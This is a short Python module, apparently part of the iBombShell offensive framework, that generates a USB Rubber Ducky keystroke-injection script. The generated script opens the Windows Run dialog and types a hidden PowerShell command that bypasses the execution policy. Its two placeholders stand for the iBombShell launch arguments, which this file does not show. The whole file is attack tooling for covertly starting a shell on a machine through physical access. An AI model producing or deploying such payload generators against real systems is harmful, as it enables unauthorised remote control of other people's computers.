from termcolor import colored, cprint
from module import ModuleGenerate
from printib import print_ok, print_info, print_error
import base64

class CustomModule(ModuleGenerate):

    def __init__(self):
        information = {"Name": "Generate a Rubber script for iBombShell ",
                       "Description": "This module generates a Rubber script to launch iBombShell",
                       "Author": "@josueencinar"}
        # Constructor of the parent class
        super(CustomModule, self).__init__(information)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        rubber_code = """DELAY 1000
GUI r
DELAY 1000
STRING powershell
ENTER
DELAY 2000
STRING powershell.exe -W Hidden -EP bypass {} {}
ENTER
"""
        
        self.run(rubber_code, "txt")